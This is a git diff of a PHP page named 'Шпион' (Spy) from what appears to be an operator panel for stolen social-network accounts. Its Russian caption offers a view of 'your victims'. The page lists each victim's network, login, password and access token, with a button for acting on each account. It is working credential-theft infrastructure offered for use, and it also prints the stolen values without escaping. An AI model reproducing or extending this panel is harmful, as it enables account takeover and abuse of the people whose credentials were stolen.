@@ -1,12 +1,66 @@
 <?php
-// Модуль шпиона версия 0.0.1
+// Проверка на целостность файловой структуры.
+if(!defined("integrity_protection")) {require_once $_SERVER['DOCUMENT_ROOT'].'/version/stable/system/pages/error/404.php';exit();}
 ?>
-
 <html>
 <head>
-    <title>Шпион | </title>
+    <title>Шпион</title>
+    <link rel="stylesheet" href=<?php echo $GLOBALS['HOME']['style']; ?>>
 </head>
 <body>
+<div class="wrapaper">
 
+    <?php include $GLOBALS['HOME']['dir'].'/system/pages/header.php'; ?>
+
+    <div class="main">
+        <div class="infoRoute">
+            <h2>Шпион</h2>
+            <h4>Здесь вы можете просмотреть всю информацию о Ваших жертвах в их социальной сети.</h4>
+        </div>
+        <div class="container">
+            <table class='table'>
+                <thead>
+                <tr>
+                    <th>№</th>
+                    <th>Сеть</th>
+                    <th>Логин</th>
+                    <th>Пароль</th>
+                    <th>Токен</th>
+                    <th>Управление</th>
+                </tr>
+                </thead>
+                <tbody>
+                <?php
+                $db = new \cp\database();
+                $seeds = $db->get('array','seeds','id_reff = '.$_SESSION['user']['id']);
+                foreach ($seeds as $seeds)
+                {
+                    echo "
+                    
+                    <tr>
+                        <td>$seeds[id]</td>
+                        <td>$seeds[network]</td>
+                        <td>$seeds[username]</td>
+                        <td>$seeds[passcode]</td>
+                        <td><textarea cols='50'>$seeds[access_token]</textarea> </td>
+                        <td>
+                            <form method='post'>
+                                <input type='hidden' name='command_more' value='$seeds[id]'>
+                                <button type='submit' name='command' value=view_$seeds[network]>GO</button>
+                            </form>
+                        </td>
+                    </tr>
+                    
+                    ";
+                }
+                ?>
+                </tbody>
+            </table>
+        </div>
+    </div>
+
+    <?php include $GLOBALS['HOME']['dir'].'/system/pages/footer.php'; ?>
+
+</div>
 </body>
 </html>
